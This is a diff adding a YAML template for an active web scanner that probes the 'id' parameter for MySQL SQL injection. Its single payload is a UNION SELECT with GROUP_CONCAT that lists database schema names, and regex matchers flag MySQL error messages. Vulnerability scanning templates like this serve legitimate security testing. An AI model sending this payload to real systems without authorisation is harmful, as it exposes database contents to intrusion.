@@ -1,0 +1,22 @@
+id: patt-sqli-mysql-group-01-id
+name: 'PATT sqli patt-sqli-mysql-group-01 via id'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - php
+description: 'PATT MySQL dump schemata via GROUP_CONCAT. [patt:patt-sqli-mysql-group-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      id:
+        - ''' UNION SELECT 1,2,3,4,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata-- -'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
